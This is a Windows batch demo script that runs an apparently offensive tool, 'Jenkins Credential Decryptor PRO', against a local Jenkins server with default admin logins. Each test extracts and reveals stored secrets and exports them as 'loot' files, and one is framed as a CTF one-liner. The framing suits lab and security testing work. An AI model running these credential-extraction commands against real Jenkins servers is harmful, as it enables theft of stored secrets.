@echo off
echo ========================================
echo Jenkins Credential Decryptor PRO - Demo
echo Testing against localhost:8080
echo ========================================
echo.

echo [*] Test 1: Basic extraction with credential analysis
python decrypt_pro.py --quick http://localhost:8080 --username admin --password admin --reveal-secrets --analyze
echo.
echo.

echo [*] Test 2: Export to all formats
python decrypt_pro.py --quick http://localhost:8080 --username admin --password admin --export-all demo_loot --force --quiet
echo.
echo [+] Files exported to demo_loot/:
dir demo_loot /B
echo.
echo.

echo [*] Test 3: Quick one-liner for CTF (JSON output)
python decrypt_pro.py --quick http://localhost:8080 --username admin --password admin --export-json quick_loot.json --force --quiet
echo [+] Secrets exported to quick_loot.json
echo.

echo ========================================
echo Demo Complete!
echo ========================================
